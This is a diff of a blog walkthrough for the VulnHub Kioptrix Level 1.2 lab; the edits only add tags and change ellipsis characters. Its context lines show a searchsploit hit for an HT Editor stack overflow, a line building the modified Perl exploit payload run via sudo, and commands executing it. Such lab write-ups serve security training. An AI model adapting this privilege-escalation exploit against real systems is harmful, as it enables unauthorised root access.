@@ -4,7 +4,7 @@ title:  "Kioptrix: Level 1.2 (#3)"
 date:   2019-05-13 14:29:33 +0000
 author: Larry Brown
 category: Walkthroughs
-tags: [kioptrix]
+tags: [kioptrix, lotuscms, ht editor, perl, sudo]
 ---
     <div>VulnHub URL: <a target="_blank" href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">https://www.vulnhub.com/entry/kioptrix-level-12-3,24/</a></div>
     <div>Hostname: Kioptrix3</div>
@@ -388,7 +388,7 @@ tags: [kioptrix]
     <div><br /></div>
     <div class="note"><b>NOTE:</b> Before going any further with this account and this exploit, I went ahead and SSH’d to the victim using the loneferret account and credentials. This way I had a much nicer shell to work in.</div>
     <div><br /></div>
-    <div>Checking the version of the editor against known exploits…</div>
+    <div>Checking the version of the editor against known exploits...</div>
     <div><br /></div>
     <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
         <div>loneferret@Kioptrix3:~$ /usr/local/bin/ht --version</div>
@@ -397,7 +397,7 @@ tags: [kioptrix]
         <div>(c) 1999-2009 Sebastian Biallas &lt;<a href="mailto:sb@biallas.net">sb@biallas.net</a>&gt;</div>
     </div>
     <div><br /></div>
-    <div>…we have a known stack overflow issue with the installed version.</div>
+    <div>...we have a known stack overflow issue with the installed version.</div>
     <div><br /></div>
     <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
         <div>HT Editor 2.0.18 - File Opening Stack Overflow                                                               | exploits/linux/local/17083.pl</div>
@@ -476,7 +476,7 @@ tags: [kioptrix]
         <div>&gt; my @payload = ("sudo", $infos-&gt;[0], ("A" x ($infos-&gt;[1] - length(qx{pwd}))) . reverse(pack('H*', $infos-&gt;[3])) . reverse(pack('H*', $esp)) . $infos-&gt;[2]);</div>
     </div>
     <div><br /></div>
-    <div>So, our final exploit script, with all the changes becomes…</div>
+    <div>So, our final exploit script, with all the changes becomes...</div>
     <div><br /></div>
     <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
         <div>root@kali:~/Walkthroughs/kioptrix3# cat 17083.pl</div>
@@ -649,7 +649,7 @@ tags: [kioptrix]
         <div>loneferret@Kioptrix3:~$ export TERM=linux</div>
     </div>
     <div><br /></div>
-    <div>Running again…</div>
+    <div>Running again...</div>
     <div><br /></div>
     <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
         <div>loneferret@Kioptrix3:~$ perl 17083.pl</div>
